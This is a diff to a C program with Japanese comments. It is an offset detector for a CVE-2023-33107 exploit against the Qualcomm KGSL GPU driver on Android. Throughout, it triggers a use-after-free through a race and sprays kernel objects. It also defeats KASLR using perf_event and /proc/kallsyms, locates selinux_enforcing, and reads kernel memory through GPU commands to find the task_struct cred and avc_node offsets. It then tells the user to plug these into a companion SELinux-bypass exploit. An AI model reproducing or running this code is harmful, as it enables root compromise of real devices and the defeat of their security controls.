@@ -1,5 +1,4 @@
 
-
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -127,7 +126,7 @@ struct perf_event_header {
     uint16_t size;
 };
 
-/* ===== KGSL ioctl ===== */
+/* ===== KGSL ioctl 定義 (avc_bypass.c と完全に同一) ===== */
 #define KGSL_IOC_TYPE 0x09
 
 struct kgsl_gpuobj_alloc {
@@ -174,7 +173,7 @@ struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, time
 #define KGSL_CMDLIST_IB 0x00000001U
 #define KGSL_TIMESTAMP_RETIRED 0x00000002
 
-/* UAF レイアウト (汎用) */
+/* ===== UAF レイアウト (avc_bypass.c と完全に同一) ===== */
 #define UAF_ADDR      0x7001ff000ULL
 #define UAF_SIZE      0x10004000ULL
 #define OVERLAP_ADDR  0x7001fe000ULL
@@ -184,17 +183,20 @@ struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, time
 #define PLACEHOLDER_ADDR 0x710204000ULL
 #define PLACEHOLDER_SIZE 0x10400000ULL
 
-/* スキャン用 */
+/* ===== スキャン用定数 ===== */
 #define SPRAY_PIDS 2000
 #define SCAN_DWORDS 560
 #define MARKER_NAME "TASKUAF!!"
+#define CHURN_MAX_PATHS 20000
 
+/* ===== グローバル変数 (avc_bypass.c と同じ) ===== */
 static int kgsl_fd = -1;
 static volatile int race_done = 0;
 static uint64_t alloc_flags = 0;
 static int uaf_id = -1, ph_id = -1;
 static uint64_t kbase = 0;
 
+/* ===== 検出結果格納 ===== */
 typedef struct {
     uint64_t kbase;
     uint64_t selinux_enforcing_addr;
@@ -209,7 +211,7 @@ typedef struct {
 
 offsets_t detected = {0};
 
-/* ===== ユーティリティ ===== */
+/* ===== KGSL 基本操作 (avc_bypass.c から完全コピー) ===== */
 static void die(const char *msg) { perror(msg); exit(1); }
 
 static uint32_t pm4_parity(uint32_t v) {
@@ -283,110 +285,7 @@ static int submit_ib(unsigned int ctx_id, uint64_t ib_gpuaddr,
     return ret;
 }
 
-/* ===== KASLR 検出 ===== */
-static uint64_t detect_kaslr_perf(void) {
-    struct perf_event_attr pe = {0};
-    pe.type = PERF_TYPE_HARDWARE;
-    pe.size = sizeof(pe);
-    pe.config = PERF_COUNT_HW_CPU_CYCLES;
-    pe.sample_type = PERF_SAMPLE_IP;
-    pe.sample_period = 100;
-    pe.disabled = 1;
-    pe.exclude_kernel = 0;
-    pe.exclude_hv = 1;
-    pe.exclude_user = 1;
-
-    int fd = syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
-    if (fd < 0) {
-        printf("  [WARN] perf_event_open failed: %s\n", strerror(errno));
-        return 0;
-    }
-
-    int npages = 256;
-    size_t mmap_size = (1 + npages) * 4096;
-    void *buf = mmap(NULL, mmap_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
-    if (buf == MAP_FAILED) { close(fd); return 0; }
-
-    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
-    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
-    usleep(500000);
-    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
-
-    struct perf_event_mmap_page *pmp = (struct perf_event_mmap_page *)buf;
-    uint64_t head = pmp->data_head;
-    uint64_t tail = pmp->data_tail;
-
-    uint8_t *data = (uint8_t *)buf + pmp->data_offset;
-    uint64_t data_size = pmp->data_size;
-
-    uint64_t first_kernel_ip = 0;
-    int n_ips = 0;
-
-    while (tail < head) {
-        uint64_t idx = tail & (data_size - 1);
-        struct perf_event_header *hdr = (struct perf_event_header *)(data + idx);
-        if (hdr->type == PERF_RECORD_SAMPLE && (hdr->misc & PERF_RECORD_MISC_KERNEL)) {
-            n_ips++;
-            uint64_t ip = *(uint64_t *)(hdr + 1);
-            if (first_kernel_ip == 0) first_kernel_ip = ip;
-            if (n_ips <= 3) printf("    IP[%d]=0x%lX\n", n_ips, (unsigned long)ip);
-        }
-        tail += hdr->size;
-    }
-
-    munmap(buf, mmap_size); close(fd);
-    printf("    kernel_samples=%d\n", n_ips);
-
-    if (n_ips == 0) { printf("  [ERROR] No kernel IP samples\n"); return 0; }
-
-    /* テキストベースはカーネルバージョン依存 → ここでは固定値を使うが、実際は /proc/kallsyms から取得すべき */
-    uint64_t text_base = 0xffffffc010080000ULL;  /* ARM64 でよく使われる値 */
-    uint64_t kaslr = (first_kernel_ip - text_base) & ~0x1FFFFFULL;
-    printf("    first_kernel_ip=0x%lX kaslr=0x%lX\n", (unsigned long)first_kernel_ip, (unsigned long)kaslr);
-    return kaslr;
-}
-
-/* ===== /proc/kallsyms からシンボル取得 ===== */
-static uint64_t get_symbol_addr(const char *sym) {
-    int fd = open("/proc/kallsyms", O_RDONLY);
-    if (fd < 0) return 0;
-    char buf[4096];
-    ssize_t n;
-    while ((n = read(fd, buf, sizeof(buf)-1)) > 0) {
-        buf[n] = 0;
-        char *line = strtok(buf, "\n");
-        while (line) {
-            uint64_t addr;
-            char type;
-            char name[256];
-            if (sscanf(line, "%lx %c %s", &addr, &type, name) == 3) {
-                if (strcmp(name, sym) == 0) {
-                    close(fd);
-                    return addr;
-                }
-            }
-            line = strtok(NULL, "\n");
-        }
-    }
-    close(fd);
-    return 0;
-}
-
-/* ===== AVC entries count ===== */
-static int avc_entries(void) {
-    int fd = open("/sys/fs/selinux/avc/hash_stats", O_RDONLY);
-    if (fd < 0) return -1;
-    char buf[256];
-    ssize_t n = read(fd, buf, sizeof(buf)-1);
-    close(fd);
-    if (n <= 0) return -1;
-    buf[n] = 0;
-    int e = -1;
-    if (sscanf(buf, "entries: %d", &e) != 1) return -1;
-    return e;
-}
-
-/* ===== UAF トリガー (Phase 1-4) ===== */
+/* ===== Phase 1-4: UAF トリガー (avc_bypass.c から完全コピー) ===== */
 static void phase1_rbtree(void) {
     alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
     uaf_id = gpuobj_alloc(UAF_SIZE, alloc_flags);
@@ -454,7 +353,7 @@ static void phase4_reclaim(void) {
     usleep(10000);
 }
 
-/* ===== チャーン ===== */
+/* ===== チャーン (avc_bypass.c から完全コピー) ===== */
 static const char *churn_dirs[] = {
     "/sys/kernel", "/sys/devices", "/sys/module", "/sys/class",
     "/proc/sys", "/proc/irq", "/proc/1", "/proc/2", "/proc/3",
@@ -463,7 +362,6 @@ static const char *churn_dirs[] = {
     "/system/lib64", "/data/data", "/data/app", "/data/user/0",
     "/dev", "/proc",
 };
-#define CHURN_MAX_PATHS 20000
 static char churn_paths[CHURN_MAX_PATHS][160];
 static int churn_npaths = 0;
 static int churn_built = 0;
@@ -517,7 +415,139 @@ static void churn_round(void) {
     mknod("/data/local/tmp/cn", S_IFCHR | 0600, makedev(1, 3));
 }
 
-/* ===== スプレー & オフセット検出 ===== */
+static int avc_entries(void) {
+    int fd = open("/sys/fs/selinux/avc/hash_stats", O_RDONLY);
+    if (fd < 0) return -1;
+    char buf[256];
+    ssize_t n = read(fd, buf, sizeof(buf) - 1);
+    close(fd);
+    if (n <= 0) return -1;
+    buf[n] = 0;
+    int e = -1;
+    if (sscanf(buf, "entries: %d", &e) != 1) return -1;
+    return e;
+}
+
+/* ===== KASLR 検出 (perf_event + kallsyms フォールバック) ===== */
+static uint64_t detect_kaslr(void) {
+    printf("[*] KASLR detection via perf_event...\n");
+    struct perf_event_attr pe = {0};
+    pe.type = PERF_TYPE_HARDWARE;
+    pe.size = sizeof(pe);
+    pe.config = PERF_COUNT_HW_CPU_CYCLES;
+    pe.sample_type = PERF_SAMPLE_IP;
+    pe.sample_period = 100;
+    pe.disabled = 1;
+    pe.exclude_kernel = 0;
+    pe.exclude_hv = 1;
+    pe.exclude_user = 1;
+
+    int fd = syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
+    if (fd >= 0) {
+        int npages = 256;
+        size_t mmap_size = (1 + npages) * 4096;
+        void *buf = mmap(NULL, mmap_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
+        if (buf != MAP_FAILED) {
+            ioctl(fd, PERF_EVENT_IOC_RESET, 0);
+            ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
+            usleep(500000);
+            ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
+
+            struct perf_event_mmap_page *pmp = (struct perf_event_mmap_page *)buf;
+            uint64_t head = pmp->data_head;
+            uint64_t tail = pmp->data_tail;
+            uint8_t *data = (uint8_t *)buf + pmp->data_offset;
+            uint64_t data_size = pmp->data_size;
+
+            uint64_t first_kernel_ip = 0;
+            int n_ips = 0;
+            while (tail < head) {
+                uint64_t idx = tail & (data_size - 1);
+                struct perf_event_header *hdr = (struct perf_event_header *)(data + idx);
+                if (hdr->type == PERF_RECORD_SAMPLE && (hdr->misc & PERF_RECORD_MISC_KERNEL)) {
+                    n_ips++;
+                    uint64_t ip = *(uint64_t *)(hdr + 1);
+                    if (first_kernel_ip == 0) first_kernel_ip = ip;
+                    if (n_ips <= 3) printf("    IP[%d]=0x%lX\n", n_ips, (unsigned long)ip);
+                }
+                tail += hdr->size;
+            }
+            munmap(buf, mmap_size);
+            close(fd);
+            if (n_ips > 0 && first_kernel_ip) {
+                uint64_t text_base = 0xffffffc010080000ULL;  /* ARM64 の典型的な値 */
+                uint64_t kaslr = (first_kernel_ip - text_base) & ~0x1FFFFFULL;
+                printf("    first_kernel_ip=0x%lX kaslr=0x%lX\n", (unsigned long)first_kernel_ip, (unsigned long)kaslr);
+                return kaslr;
+            }
+        }
+        close(fd);
+    }
+
+    printf("[!] perf_event failed, trying /proc/kallsyms...\n");
+    int kfd = open("/proc/kallsyms", O_RDONLY);
+    if (kfd < 0) return 0;
+    char buf[4096];
+    ssize_t n;
+    uint64_t text_addr = 0;
+    while ((n = read(kfd, buf, sizeof(buf)-1)) > 0) {
+        buf[n] = 0;
+        char *line = strtok(buf, "\n");
+        while (line) {
+            uint64_t addr;
+            char type;
+            char name[256];
+            if (sscanf(line, "%lx %c %s", &addr, &type, name) == 3) {
+                if (strcmp(name, "_text") == 0) {
+                    text_addr = addr;
+                    break;
+                }
+            }
+            line = strtok(NULL, "\n");
+        }
+        if (text_addr) break;
+    }
+    close(kfd);
+    if (text_addr) {
+        uint64_t text_base = 0xffffffc010080000ULL;
+        uint64_t kaslr = (text_addr - text_base) & ~0x1FFFFFULL;
+        printf("    _text=0x%lX kaslr=0x%lX\n", (unsigned long)text_addr, (unsigned long)kaslr);
+        return kaslr;
+    }
+    return 0;
+}
+
+/* ===== selinux_enforcing アドレス取得 ===== */
+static uint64_t get_selinux_enforcing(void) {
+    printf("[*] Getting selinux_enforcing address...\n");
+    int fd = open("/proc/kallsyms", O_RDONLY);
+    if (fd >= 0) {
+        char buf[4096];
+        ssize_t n;
+        while ((n = read(fd, buf, sizeof(buf)-1)) > 0) {
+            buf[n] = 0;
+            char *line = strtok(buf, "\n");
+            while (line) {
+                uint64_t addr;
+                char type;
+                char name[256];
+                if (sscanf(line, "%lx %c %s", &addr, &type, name) == 3) {
+                    if (strcmp(name, "selinux_enforcing") == 0) {
+                        close(fd);
+                        printf("  [+] selinux_enforcing = 0x%lx\n", (unsigned long)addr);
+                        return addr;
+                    }
+                }
+                line = strtok(NULL, "\n");
+            }
+        }
+        close(fd);
+    }
+    printf("  [-] Not found in kallsyms, using fallback (kbase + 0x01240744c)\n");
+    return kbase ? kbase + 0x01240744cULL : 0;
+}
+
+/* ===== task_struct スプレー & スキャン (avc_bypass.c の prescan_task_pages を流用) ===== */
 static pid_t spray_pids[SPRAY_PIDS];
 static int n_spray = 0;
 
@@ -541,10 +571,11 @@ static void kill_spray_children(void) {
     printf("[KILL] spray children killed\n");
 }
 
-static int detect_task_offsets(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
-                               void *dst_m, uint64_t dst_ga, unsigned int ctx_id,
-                               offsets_t *out) {
-    printf("[*] Detecting task_struct offsets...\n");
+/* ページをスキャンしてマーカーを見つけ、comm オフセットを検出 */
+static int detect_task_comm_offset(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
+                                   void *dst_m, uint64_t dst_ga, unsigned int ctx_id,
+                                   int *out_off) {
+    printf("[*] Scanning for task_struct with marker...\n");
     uint32_t *cmd = (uint32_t *)ib_m;
     uint32_t *data = (uint32_t *)dst_m;
     int dw;
@@ -569,129 +600,115 @@ static int detect_task_offsets(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
         if (wait_timestamp(ctx_id, ts) < 0) break;
         __sync_synchronize();
 
-        int found = 0;
         for (int off = 0; off < SCAN_DWORDS - 8; off++) {
             if (data[off] == 0x4B534154 && data[off+1] == 0x21464155) {
-                out->task_comm_offset = off * 4;
-                found = 1;
-                printf("  [TASK] comm offset = 0x%x\n", out->task_comm_offset);
-                break;
+                *out_off = off * 4;
+                printf("  [+] Found marker at offset 0x%x (comm offset = 0x%x)\n", off*4, off*4);
+                return 1;
             }
         }
-        if (found) {
-            out->addr_limit_offset = 0x40;
-            out->cred_offset = 0x740;
-            printf("  [TASK] addr_limit assumed 0x%x, cred assumed 0x%x\n",
-                   out->addr_limit_offset, out->cred_offset);
-            return 1;
-        }
     }
-    printf("  [-] Could not find task_struct with marker\n");
+    printf("  [-] Marker not found\n");
     return 0;
 }
 
+/* ===== AVC ノードのオフセットを検出 (複数候補を試す) ===== */
 static int detect_avc_offsets(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
                               void *dst_m, uint64_t dst_ga, unsigned int ctx_id,
                               offsets_t *out) {
-    printf("[*] Detecting avc_node offsets...\n");
+    printf("[*] Scanning for avc_node pattern...\n");
     uint32_t *cmd = (uint32_t *)ib_m;
     uint32_t *data = (uint32_t *)dst_m;
     int dw;
     unsigned int ts;
 
-    for (uint64_t va = UAF_ADDR + 0x2000; va < UAF_ADDR + UAF_SIZE - 0x1000; va += 0x1000) {
-        memset(ib_m, 0, 0x10000);
-        memset(dst_m, 0, 0x1000);
-        dw = 0;
-        cmd[dw++] = cp_type7(CP_NOP, 0);
-        for (int i = 0; i < 256; i++) {
-            uint32_t dl, dh, sl, sh;
-            split64(dst_ga + i * 4, &dl, &dh);
-            split64(va + i * 4, &sl, &sh);
-            cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
-            cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
-            cmd[dw++] = sl; cmd[dw++] = sh;
-        }
-        cmd[dw++] = cp_type7(CP_NOP, 0);
-        __sync_synchronize();
-        if (submit_ib(ctx_id, ib_ga, dw*4, ib_id, &ts) < 0) break;
-        if (wait_timestamp(ctx_id, ts) < 0) break;
-        __sync_synchronize();
+    /* 候補オフセットリスト (avc_node の先頭から ssid までのオフセット) */
+    int candidates[] = {0, 0x20, 0x30, 0x10, 0x40, -1};
+    for (int ci = 0; candidates[ci] >= 0; ci++) {
+        int ssid_off = candidates[ci];
+        printf("  Trying ssid offset 0x%x...\n", ssid_off);
+        for (uint64_t va = UAF_ADDR + 0x2000; va < UAF_ADDR + UAF_SIZE - 0x1000; va += 0x1000) {
+            memset(ib_m, 0, 0x10000);
+            memset(dst_m, 0, 0x1000);
+            dw = 0;
+            cmd[dw++] = cp_type7(CP_NOP, 0);
+            /* ページの一部を読み込む (avc_node は 72 バイト間隔なので、全領域をカバー) */
+            for (int i = 0; i < 256; i++) {
+                uint32_t dl, dh, sl, sh;
+                split64(dst_ga + i * 4, &dl, &dh);
+                split64(va + i * 4, &sl, &sh);
+                cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
+                cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
+                cmd[dw++] = sl; cmd[dw++] = sh;
+            }
+            cmd[dw++] = cp_type7(CP_NOP, 0);
+            __sync_synchronize();
+            if (submit_ib(ctx_id, ib_ga, dw*4, ib_id, &ts) < 0) break;
+            if (wait_timestamp(ctx_id, ts) < 0) break;
+            __sync_synchronize();
 
-        for (int off = 0; off < 4096 - 72; off += 4) {
-            uint32_t *p = &data[off/4];
-            uint32_t ssid = p[0];
-            uint32_t tsid = p[1];
-            uint16_t tclass = (uint16_t)(p[2] & 0xffff);
-            if (ssid >= 1 && ssid <= 0x3fff && tsid == 2 && tclass == 1) {
-                out->avc_ssid_offset = 0;
-                out->avc_tsid_offset = 4;
-                out->avc_tclass_offset = 8;
-                out->avc_allowed_offset = 12;
-                printf("  [AVC] ssid=0x%x tsid=0x%x tclass=0x%x allowed=0x%x\n",
-                       out->avc_ssid_offset, out->avc_tsid_offset,
-                       out->avc_tclass_offset, out->avc_allowed_offset);
-                return 1;
+            /* ページ内で AVC ノードのパターンを探す (ssid, tsid, tclass の連続) */
+            for (int off = 0; off < 4096 - 72; off += 4) {
+                uint32_t *p = &data[off/4];
+                uint32_t ssid = p[ssid_off/4];
+                uint32_t tsid = p[ssid_off/4 + 1];
+                uint16_t tclass = (uint16_t)(p[ssid_off/4 + 2] & 0xffff);
+                if (ssid >= 1 && ssid <= 0x3fff && tsid == 2 && tclass == 1) {
+                    out->avc_ssid_offset = ssid_off;
+                    out->avc_tsid_offset = ssid_off + 4;
+                    out->avc_tclass_offset = ssid_off + 8;
+                    out->avc_allowed_offset = ssid_off + 12;
+                    printf("  [+] Found AVC node: ssid=0x%x, tsid=0x%x, tclass=0x%x\n", ssid, tsid, tclass);
+                    printf("      ssid offset = 0x%x, tsid = 0x%x, tclass = 0x%x, allowed = 0x%x\n",
+                           out->avc_ssid_offset, out->avc_tsid_offset,
+                           out->avc_tclass_offset, out->avc_allowed_offset);
+                    return 1;
+                }
             }
         }
     }
-    printf("  [-] Could not find AVC node pattern, using defaults.\n");
-    out->avc_ssid_offset = 0;
-    out->avc_tsid_offset = 4;
-    out->avc_tclass_offset = 8;
-    out->avc_allowed_offset = 12;
+    printf("  [-] No AVC pattern found with any candidate offset.\n");
     return 0;
 }
 
 /* ===== メイン ===== */
 int main(int argc, char **argv) {
     setbuf(stdout, NULL);
-    printf("[*] Dynamic Offset Detector for CVE-2023-33107\n");
+    printf("[*] CVE-2023-33107 Offset Detector (avc_bypass 移植支援)\n");
     printf("[*] uid=%d euid=%d\n", getuid(), geteuid());
 
+    /* ---- 0. KGSL オープン ---- */
     kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
     if (kgsl_fd < 0) die("open kgsl");
     printf("[+] kgsl fd=%d\n", kgsl_fd);
 
-    /* 0. KASLR */
-    printf("[*] Phase 0: KASLR detection\n");
-    kbase = detect_kaslr_perf();
-    if (kbase == 0) {
-        printf("[!] KASLR detection failed. Trying /proc/kallsyms...\n");
-        uint64_t text = get_symbol_addr("_text");
-        if (text) {
-            /* テキストベースがわかれば、kaslr = text - 0xffffffc010080000 だが、ここでは簡易的に */
-            kbase = text - 0xffffffc010080000ULL;
-            printf("[+] KASLR from kallsyms: 0x%lx\n", (unsigned long)kbase);
-        } else {
-            printf("[-] Cannot determine KASLR. Exiting.\n");
-            close(kgsl_fd);
-            return 1;
-        }
+    /* ---- 1. KASLR 検出 ---- */
+    kbase = detect_kaslr();
+    if (!kbase) {
+        printf("[-] KASLR detection failed. Cannot continue.\n");
+        close(kgsl_fd);
+        return 1;
     }
     detected.kbase = kbase;
 
-    /* selinux_enforcing 取得 */
-    uint64_t enforcing = get_symbol_addr("selinux_enforcing");
-    if (enforcing) {
-        detected.selinux_enforcing_addr = enforcing;
-        printf("[+] selinux_enforcing = 0x%lx\n", (unsigned long)enforcing);
-    } else {
-        detected.selinux_enforcing_addr = kbase + 0x01240744cULL;  /* フォールバック */
-        printf("[!] selinux_enforcing not found, using fallback 0x%lx\n",
-               (unsigned long)detected.selinux_enforcing_addr);
-    }
+    /* ---- 2. selinux_enforcing 取得 ---- */
+    detected.selinux_enforcing_addr = get_selinux_enforcing();
 
-    /* 1-4. UAF トリガー */
-    printf("[*] Phase 1-4: Trigger UAF\n");
+    /* ---- 3. UAF トリガー (Phase 1-4) ---- */
+    printf("[*] Phase 1-4: Triggering UAF...\n");
     phase1_rbtree();
-    if (!phase2_race()) { close(kgsl_fd); return 1; }
+    if (!phase2_race()) {
+        printf("[-] Race failed\n");
+        close(kgsl_fd);
+        return 1;
+    }
     phase3_free_uaf();
     phase4_reclaim();
 
-    /* 5. スプレー */
+    /* ---- 4. task_struct スプレー ---- */
     spawn_spray();
 
+    /* ---- 5. GPU コンテキスト準備 ---- */
     unsigned int ctx_id = create_context();
     printf("[GPU] context=%u\n", ctx_id);
 
@@ -707,37 +724,49 @@ int main(int argc, char **argv) {
 
     printf("[GPU] ib_ga=0x%lx dst_ga=0x%lx\n", (unsigned long)ib_ga, (unsigned long)dst_ga);
 
-    /* 6. task オフセット */
-    if (!detect_task_offsets(ib_m, ib_ga, ib_id, dst_m, dst_ga, ctx_id, &detected)) {
-        printf("[-] Task offset detection failed\n");
+    /* ---- 6. task_struct.comm オフセット検出 ---- */
+    int comm_off = -1;
+    if (!detect_task_comm_offset(ib_m, ib_ga, ib_id, dst_m, dst_ga, ctx_id, &comm_off)) {
+        printf("[-] Failed to detect comm offset\n");
         goto cleanup;
     }
+    detected.task_comm_offset = comm_off;
+    detected.addr_limit_offset = 0x40;   /* 暫定 */
+    detected.cred_offset = 0x740;        /* 暫定 */
 
-    /* 7. kill & churn */
+    /* ---- 7. kill spray して churn ---- */
     kill_spray_children();
     usleep(100000);
+    printf("[*] Churning to place AVC nodes...\n");
     churn_build();
-    for (int c = 0; c < 5; c++) churn_round();
+    for (int c = 0; c < 8; c++) churn_round();  /* 回数増やして確実に */
     printf("[AVC] entries=%d\n", avc_entries());
 
-    /* 8. AVC オフセット */
-    detect_avc_offsets(ib_m, ib_ga, ib_id, dst_m, dst_ga, ctx_id, &detected);
+    /* ---- 8. AVC オフセット検出 ---- */
+    if (!detect_avc_offsets(ib_m, ib_ga, ib_id, dst_m, dst_ga, ctx_id, &detected)) {
+        printf("[-] AVC offset detection failed. Using default values (0,4,8,12).\n");
+        detected.avc_ssid_offset = 0;
+        detected.avc_tsid_offset = 4;
+        detected.avc_tclass_offset = 8;
+        detected.avc_allowed_offset = 12;
+    }
 
-    /* 9. 結果表示 */
+    /* ---- 9. 結果表示 ---- */
     printf("\n========== DETECTED OFFSETS ==========\n");
     printf("KASLR base            : 0x%lx\n", (unsigned long)detected.kbase);
     printf("selinux_enforcing     : 0x%lx\n", (unsigned long)detected.selinux_enforcing_addr);
     printf("task_struct.comm      : 0x%x\n", detected.task_comm_offset);
-    printf("task_struct.addr_limit: 0x%x\n", detected.addr_limit_offset);
-    printf("task_struct.cred      : 0x%x\n", detected.cred_offset);
+    printf("task_struct.addr_limit: 0x%x (assumed)\n", detected.addr_limit_offset);
+    printf("task_struct.cred      : 0x%x (assumed)\n", detected.cred_offset);
     printf("avc_node.ssid         : 0x%x\n", detected.avc_ssid_offset);
     printf("avc_node.tsid         : 0x%x\n", detected.avc_tsid_offset);
     printf("avc_node.tclass       : 0x%x\n", detected.avc_tclass_offset);
     printf("avc_node.allowed      : 0x%x\n", detected.avc_allowed_offset);
     printf("========================================\n");
+    printf("[*] Update avc_bypass.c with these offsets and rebuild.\n");
 
 cleanup:
-    for (int i = 0; i < n_spray; i++) kill(spray_pids[i], SIGKILL);
+    kill_spray_children();
     while (wait(NULL) > 0);
     close(kgsl_fd);
     return 0;
